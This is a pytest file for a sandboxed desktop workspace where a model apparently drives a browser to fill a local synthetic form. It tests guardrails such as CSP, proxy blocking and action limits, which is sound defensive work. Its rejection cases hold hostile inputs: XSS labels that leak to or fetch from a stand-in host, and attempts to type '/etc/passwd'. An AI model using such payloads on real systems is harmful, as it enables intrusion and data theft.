from __future__ import annotations

import base64
import hashlib
import http.client
import json
import os
import shutil
import signal
import struct
import subprocess
import urllib.request
from urllib.parse import urlsplit
import zlib
from pathlib import Path
from types import SimpleNamespace
from uuid import uuid4

import pytest

from shared_context import gui, m2_desktop
from shared_context.errors import Problem


@pytest.fixture
def owned_root():
    root = Path(__file__).resolve().parent / f".m2-desktop-{uuid4().hex}"
    root.mkdir()
    try:
        yield root
    finally:
        shutil.rmtree(root)


@pytest.mark.parametrize("platform,uid,message", [
    ("win32", 10001, "Linux"),
    ("darwin", 10001, "Linux"),
    ("linux", 0, "non-root"),
])
def test_start_refuses_unsupported_host_without_creating_fake_evidence(
    monkeypatch, owned_root, platform, uid, message,
):
    monkeypatch.setattr(m2_desktop, "sys", SimpleNamespace(platform=platform))
    monkeypatch.setattr(gui, "os", SimpleNamespace(name="posix", geteuid=lambda: uid))
    workspace = m2_desktop.DesktopWorkspace(owned_root, "synthetic-run")
    with pytest.raises(Problem, match=message) as exc:
        workspace.start()
    assert exc.value.body["error"]["code"] == "M2_DESKTOP_UNAVAILABLE"
    assert list(owned_root.iterdir()) == []


@pytest.fixture
def desktop_boundary(monkeypatch, owned_root):
    """Only fake the OS/process boundary. The fixture HTTP server and files are real."""
    helper_root = Path(__file__).resolve().parents[2] / "src" / "fa-hosted-sandbox-poc"
    monkeypatch.syspath_prepend(str(helper_root))
    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))

    png = b"\x89PNG\r\n\x1a\n"
    png += chunk(b"IHDR", struct.pack(">IIBBBBB", 1280, 800, 8, 2, 0, 0, 0))
    png += chunk(b"IDAT", zlib.compress((b"\0" + b"\0" * 1280 * 3) * 800))
    png += chunk(b"IEND", b"")
    state = SimpleNamespace(
        processes=[], inputs=[], kills=[], dialog=False, active="42",
        runtime=owned_root / "ephemeral", screenshot=png, fail_browser=False,
        title="FA M2 Desktop synthetic-run - Chromium",
    )
    real_read_text = Path.read_text

    def read_text(path, *args, **kwargs):
        if path.name == "status" and path.parent.parent.name == "proc":
            return "Uid:\t10001\t10001\t10001\t10001\n"
        return real_read_text(path, *args, **kwargs)

    def scratch(**kwargs):
        assert kwargs == {"prefix": "fam2-", "dir": "/tmp"}
        state.runtime.mkdir()
        return str(state.runtime)

    def popen(args, **kwargs):
        assert kwargs["start_new_session"] is True
        process = SimpleNamespace(
            pid=91000 + len(state.processes), args=args, env=kwargs["env"], returncode=None,
        )
        process.poll = lambda: process.returncode

        def wait(timeout):
            process.returncode = 0
            return 0

        process.wait = wait
        state.processes.append(process)
        if args[0] == "Xvfb":
            kwargs["stdout"].write("101\n")
            kwargs["stdout"].flush()
        if args[0] == "chromium":
            if state.fail_browser:
                process.returncode = 1
            else:
                with urllib.request.urlopen(args[-1], timeout=3) as response:
                    state.page = response.read().decode()
        return process

    def run(args, **kwargs):
        assert kwargs["env"]["DISPLAY"] == ":101"
        output = ""
        if args[0] == "xdotool":
            operation = args[1]
            if operation == "search":
                output = "42\n43\n" if state.dialog else "42\n"
            elif operation == "getactivewindow":
                output = state.active
            elif operation == "getwindowname":
                output = "Open File" if args[-1] == "43" else state.title
            else:
                state.inputs.append(args)
        elif args[0] == "xprop":
            dialog = args[args.index("-id") + 1] == "43"
            kind = "DIALOG" if dialog else "NORMAL"
            output = (
                f"_NET_WM_WINDOW_TYPE(ATOM) = _NET_WM_WINDOW_TYPE_{kind}\n"
                f'_NET_WM_PID(CARDINAL) = {state.processes[2].pid}\n'
                'WM_CLASS(STRING) = "chromium", "Chromium"\n'
                + ("WM_TRANSIENT_FOR(WINDOW): window id # 0x2a\n" if dialog else "")
            )
        elif args[0] == "import":
            Path(args[-1]).write_bytes(state.screenshot or b"not-a-png")
        else:
            pytest.fail(f"unexpected OS command: {args}")
        return subprocess.CompletedProcess(args, 0, stdout=output, stderr="")

    monkeypatch.setattr(m2_desktop, "sys", SimpleNamespace(platform="linux"))
    monkeypatch.setattr(gui, "os", SimpleNamespace(
        name="posix", geteuid=lambda: 10001, fsync=os.fsync, replace=os.replace,
        killpg=lambda pid, sig: state.kills.append(pid),
    ))
    monkeypatch.setattr(os, "killpg", lambda pid, sig: state.kills.append(pid), raising=False)
    monkeypatch.setattr(signal, "SIGKILL", 9, raising=False)
    monkeypatch.setattr(shutil, "which", lambda command: f"/synthetic/{command}")
    monkeypatch.setattr(Path, "read_text", read_text)
    monkeypatch.setattr(subprocess, "Popen", popen)
    monkeypatch.setattr(subprocess, "run", run)
    monkeypatch.setattr("tempfile.mkdtemp", scratch)
    return state


def test_start_only_prepares_owned_desktop_and_preserves_profile(
    monkeypatch, owned_root, desktop_boundary,
):
    monkeypatch.setenv("AZURE_CLIENT_SECRET", "must-not-enter-desktop")
    profile = owned_root / "profile" / "Default"
    profile.mkdir(parents=True)
    (profile / "Preferences").write_text(json.dumps({"synthetic_setting": "keep"}))
    workspace = m2_desktop.DesktopWorkspace(owned_root, "synthetic-run")
    with workspace as opened:
        assert opened is workspace
        assert workspace.fixture_url.startswith("http://127.0.0.1:")
        assert workspace.upload_path.read_bytes() == b"FA M2 synthetic upload only.\n"
        assert workspace.result()["submission"] is None
        assert workspace.result()["download"]["verified"] is False
        assert desktop_boundary.inputs == []
        assert 'type="file"' in desktop_boundary.page
        assert "Work label" in desktop_boundary.page and "Unit count" in desktop_boundary.page
        assert workspace.fixture_url in workspace.task_description
        assert str(workspace.upload_path) in workspace.task_description
        assert [p.args[0] for p in desktop_boundary.processes] == ["Xvfb", "openbox", "chromium"]
        for process in desktop_boundary.processes:
            assert "AZURE_CLIENT_SECRET" not in process.env
            assert not any(arg.startswith("--headless") or arg == "--no-sandbox" for arg in process.args)
        assert desktop_boundary.processes[2].env["DISPLAY"] == ":101"
    assert workspace.close()["success"] is True
    assert not desktop_boundary.runtime.exists()
    assert json.loads((profile / "Preferences").read_text())["synthetic_setting"] == "keep"
    assert set(desktop_boundary.kills) == {91000, 91001, 91002}


def test_model_must_observe_pixels_between_individual_actions_and_dialog_has_os_evidence(
    owned_root, desktop_boundary,
):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        with pytest.raises(Problem, match="observe"):
            workspace.act({"type": "click", "x": 230, "y": 320})
        observed = workspace.observe()
        assert base64.b64decode(observed["png_base64"]) == desktop_boundary.screenshot
        assert (observed["mime_type"], observed["width"], observed["height"]) == ("image/png", 1280, 800)
        assert observed["active_window"]["id"] == "42"
        assert workspace.result()["native_file_dialog_seen"] is False
        workspace.act({"type": "click", "x": 230, "y": 320})
        assert len(desktop_boundary.inputs) == 1
        with pytest.raises(Problem, match="observe"):
            workspace.act({"type": "key", "key": "Return"})
        desktop_boundary.dialog, desktop_boundary.active = True, "43"
        observed = workspace.observe()
        assert observed["active_window"]["native_file_dialog"] is True
        workspace.act({"type": "key", "key": "ctrl+l"})
        workspace.observe()
        workspace.act({"type": "type", "text": str(workspace.upload_path)})
        assert len(desktop_boundary.inputs) == 3
        evidence = workspace.result()
        assert evidence["native_file_dialog_seen"] is True
        assert evidence["native_file_dialog_observations"][0]["transient_for"] == "42"
        assert evidence["submission"] is None and evidence["download"]["verified"] is False


@pytest.mark.parametrize("action", [
    {"type": "click", "x": -1, "y": 100},
    {"type": "click", "x": 1280, "y": 100},
    {"type": "click", "x": True, "y": 100},
    {"type": "click", "x": 20, "y": 20, "button": 3},
    {"type": "type", "text": "https://example.com"},
    {"type": "type", "text": "127.0.0.1:9000"},
    {"type": "type", "text": "/etc/passwd"},
    {"type": "type", "text": "file:///etc/passwd"},
    {"type": "type", "text": "alpha\nReturn"},
    {"type": "type", "text": "x" * 1025},
    {"type": "key", "key": "ctrl+shift+j"},
    {"type": "key", "key": "ctrl+alt+t"},
    {"type": "key", "key": "Return Tab"},
    {"type": "shell", "command": "echo nope"},
    [{"type": "key", "key": "Return"}],
])
def test_actions_reject_arbitrary_navigation_chords_and_unbounded_or_batched_input(
    owned_root, desktop_boundary, action,
):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        workspace.observe()
        with pytest.raises(Problem) as exc:
            workspace.act(action)
        assert exc.value.body["error"]["code"] == "M2_DESKTOP_ACTION"
        assert desktop_boundary.inputs == []


def post_synthetic_form(workspace, content=b"FA M2 synthetic upload only.\n", *, label="amber sample"):
    boundary = "synthetic-m2-boundary"
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="label"\r\n\r\n{label}\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="count"\r\n\r\n7\r\n'
        f'--{boundary}\r\nContent-Disposition: form-data; name="upload"; filename="synthetic-upload.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    parts = urlsplit(workspace.fixture_url)
    request = urllib.request.Request(
        workspace.fixture_url + "submit", data=body, headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": f"{parts.scheme}://{parts.netloc}",
        },
    )
    return urllib.request.urlopen(request, timeout=3)


def assert_fixture_csp(headers):
    directives = {
        tokens[0]: set(tokens[1:])
        for part in headers["Content-Security-Policy"].split(";")
        if (tokens := part.split())
    }
    for directive, sources in {
        "default-src": {"'self'"},
        "script-src": {"'none'"},
        "connect-src": {"'self'"},
        "img-src": {"'self'", "data:"},
        "style-src": {"'self'", "'unsafe-inline'"},
        "object-src": {"'none'"},
        "base-uri": {"'none'"},
        "frame-src": {"'none'"},
        "frame-ancestors": {"'none'"},
        "form-action": {"'self'"},
    }.items():
        assert directives.get(directive) == sources


def test_fixture_http_csp_covers_form_confirmation_and_json_download(owned_root, desktop_boundary):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        label = "approved synthetic label"
        with urllib.request.urlopen(workspace.fixture_url, timeout=3) as response:
            assert_fixture_csp(response.headers)
            form = response.read().decode()
        with post_synthetic_form(workspace, label=label) as response:
            assert_fixture_csp(response.headers)
            confirmation = response.read().decode()
        assert label not in form and label not in confirmation
        assert "<script" not in form and "<script" not in confirmation
        with urllib.request.urlopen(workspace.fixture_url + "download", timeout=3) as response:
            assert_fixture_csp(response.headers)
            assert response.headers["Content-Type"] == "application/json"
            assert response.headers["X-Content-Type-Options"] == "nosniff"
            assert "attachment" in response.headers["Content-Disposition"]
            assert json.loads(response.read())["fields"]["label"] == label


@pytest.mark.parametrize("label", [
    '<img src="http://198.51.100.10/leak?value=synthetic">',
    '<script>fetch("http://198.51.100.10/")</script>',
])
def test_fixture_rejects_active_label_markup_without_reflecting_it(owned_root, desktop_boundary, label):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        with pytest.raises(urllib.error.HTTPError) as exc:
            post_synthetic_form(workspace, label=label)
        with exc.value as response:
            assert response.code == 422
            assert_fixture_csp(response.headers)
            body = response.read().decode()
        assert label not in body and "198.51.100.10" not in body
        assert workspace.result()["submission"] is None
        assert workspace.result()["download"]["requests"] == []


def test_fixture_records_actual_uploaded_content_and_only_validates_actual_download_bytes(
    owned_root, desktop_boundary,
):
    workspace = m2_desktop.DesktopWorkspace(owned_root, "synthetic-run")
    with workspace:
        desktop_boundary.dialog, desktop_boundary.active = True, "43"
        workspace.observe()
        workspace.act({"type": "key", "key": "Return"})
        with post_synthetic_form(workspace) as response:
            confirmation = response.read().decode()
        assert "Download receipt" in confirmation
        assert 'type="file"' not in confirmation
        result = workspace.result()
        assert result["submission"]["fields"] == {"label": "amber sample", "count": 7}
        assert result["submission"]["upload"]["content_base64"] == "RkEgTTIgc3ludGhldGljIHVwbG9hZCBvbmx5Lgo="
        assert result["submission"]["upload"]["synthetic_match"] is True
        assert result["download"]["verified"] is False and result["completed"] is False
        with urllib.request.urlopen(workspace.fixture_url + "download", timeout=3) as response:
            receipt = response.read()
            assert "attachment" in response.headers["Content-Disposition"]
        assert json.loads(receipt)["fields"] == {"label": "amber sample", "count": 7}
        assert workspace.result()["download"]["verified"] is False
        # Emulate only the external browser's download boundary; the module must never write this file.
        preferences = json.loads((owned_root / "profile" / "Default" / "Preferences").read_text())
        download = Path(preferences["download"]["default_directory"]) / "m2-receipt-synthetic-run.json"
        download.write_bytes(b"tampered")
        assert workspace.result()["download"]["verified"] is False
        download.write_bytes(receipt)
        result = workspace.result()
        assert result["download"]["verified"] is True and result["completed"] is True
        assert result["download"]["sha256"] == hashlib.sha256(receipt).hexdigest()
        assert len(result["download"]["requests"]) == 1
    saved = json.loads((owned_root / "runs" / "synthetic-run" / "evidence.json").read_text())
    assert saved["completed"] is True and saved["cleanup"]["success"] is True
    assert download.read_bytes() == receipt


def test_wrong_uploaded_content_is_recorded_but_not_accepted(owned_root, desktop_boundary):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        with pytest.raises(urllib.error.HTTPError) as exc:
            post_synthetic_form(workspace, b"wrong synthetic bytes")
        assert exc.value.code == 422
        evidence = workspace.result()
        assert evidence["submission"]["accepted"] is False
        assert evidence["submission"]["upload"]["synthetic_match"] is False
        assert evidence["submission"]["upload"]["sha256"] == hashlib.sha256(b"wrong synthetic bytes").hexdigest()
        assert "content_base64" not in evidence["submission"]["upload"]
        with pytest.raises(urllib.error.HTTPError):
            urllib.request.urlopen(workspace.fixture_url + "download", timeout=3)
        assert evidence["download"]["verified"] is False


@pytest.mark.parametrize("variant,order", [
    (0, ('name="label"', 'name="count"', 'name="upload"')),
    (1, ('name="count"', 'name="upload"', 'name="label"')),
])
def test_variant_changes_visible_layout_and_keyboard_field_order(owned_root, desktop_boundary, variant, order):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run", variant) as workspace:
        positions = [desktop_boundary.page.index(field) for field in order]
        assert positions == sorted(positions)
        assert ("margin:40px 70px" if variant == 0 else "margin:95px 280px") in desktop_boundary.page
        assert "<script" not in desktop_boundary.page
        assert workspace.result()["actions"] == 0


def test_can_refocus_owned_display_after_misclick_without_typing_into_unknown_window(
    owned_root, desktop_boundary,
):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        desktop_boundary.active = "999"
        desktop_boundary.title = "Open File - Chromium"
        workspace.observe()
        assert workspace.result()["native_file_dialog_seen"] is False
        with pytest.raises(Problem) as exc:
            workspace.act({"type": "type", "text": "amber"})
        assert exc.value.body["error"]["code"] == "M2_DESKTOP_FOCUS"
        workspace.act({"type": "click", "x": 100, "y": 100})
        assert len(desktop_boundary.inputs) == 1


def test_start_failure_stops_only_owned_processes_and_keeps_private_files(
    owned_root, desktop_boundary,
):
    desktop_boundary.fail_browser = True
    workspace = m2_desktop.DesktopWorkspace(owned_root, "synthetic-run")
    with pytest.raises(Problem) as exc:
        workspace.start()
    assert exc.value.body["error"]["code"] == "M2_DESKTOP_START_FAILED"
    assert workspace.result()["cleanup"]["success"] is True
    assert set(desktop_boundary.kills) == {91000, 91001, 91002}
    assert not desktop_boundary.runtime.exists()
    assert workspace.upload_path.exists()
    assert (owned_root / "profile" / "Default" / "Preferences").exists()


@pytest.mark.parametrize("limit", ["actions", "seconds"])
def test_budget_exhaustion_stops_desktop_without_claiming_completion(
    monkeypatch, owned_root, desktop_boundary, limit,
):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        if limit == "actions":
            monkeypatch.setattr(m2_desktop, "MAX_ACTIONS", 1)
            workspace.observe()
            workspace.act({"type": "type", "text": "amber"})
            workspace.observe()
        else:
            monkeypatch.setattr(m2_desktop, "MAX_SECONDS", 0)
        with pytest.raises(Problem) as exc:
            workspace.act({"type": "key", "key": "Tab"})
        assert exc.value.body["error"]["code"] == "M2_DESKTOP_LIMIT"
        assert not desktop_boundary.runtime.exists()
        assert workspace.result()["completed"] is False


def test_invalid_pixels_are_not_replaced_with_fake_success(owned_root, desktop_boundary):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        desktop_boundary.screenshot = b"not a PNG"
        with pytest.raises(Problem) as exc:
            workspace.observe()
        assert exc.value.body["error"]["code"] == "M2_DESKTOP_OBSERVE_FAILED"
        assert workspace.result()["completed"] is False
        assert not desktop_boundary.runtime.exists()


def test_proxy_rejects_external_ip_and_unrelated_loopback_requests(owned_root, desktop_boundary):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run") as workspace:
        address = urlsplit(workspace.fixture_url)
        connection = http.client.HTTPConnection("127.0.0.1", address.port, timeout=3)
        try:
            for method, target in (
                ("GET", "http://198.51.100.10/"),
                ("GET", "http://127.0.0.1:9000/"),
                ("CONNECT", "198.51.100.10:443"),
            ):
                connection.request(method, target)
                response = connection.getresponse()
                assert response.status == 403
                response.read()
        finally:
            connection.close()
        args = desktop_boundary.processes[2].args
        assert f"--proxy-server=http://127.0.0.1:{address.port}" in args
        assert f"--proxy-bypass-list=<-loopback>;127.0.0.1:{address.port}" in args
        assert "--window-size=1280,800" in args


def test_concurrent_desktops_are_rejected_without_mutating_another_run(owned_root, desktop_boundary):
    with m2_desktop.DesktopWorkspace(owned_root, "synthetic-run"):
        second = m2_desktop.DesktopWorkspace(owned_root, "another-run")
        with pytest.raises(Problem) as exc:
            second.start()
        assert exc.value.body["error"]["code"] == "M2_DESKTOP_BUSY"
        assert not (owned_root / "runs" / "another-run").exists()
        assert len(desktop_boundary.processes) == 3
    assert not gui.GUI_LOCK.locked()


def test_cleanup_failure_attempts_all_owned_processes_but_retains_runtime(
    monkeypatch, owned_root, desktop_boundary,
):
    workspace = m2_desktop.DesktopWorkspace(owned_root, "synthetic-run").start()

    def kill(pid, sig):
        desktop_boundary.kills.append(pid)
        if pid == 91002:
            raise OSError("synthetic process termination failure")

    monkeypatch.setattr(os, "killpg", kill)
    with pytest.raises(Problem) as exc:
        workspace.close()
    assert exc.value.body["error"]["code"] == "M2_DESKTOP_CLEANUP_FAILED"
    assert set(desktop_boundary.kills) == {91000, 91001, 91002}
    assert workspace.result()["cleanup"]["server_stopped"] is True
    assert workspace.result()["completed"] is False
    assert desktop_boundary.runtime.exists()
    assert not gui.GUI_LOCK.locked()
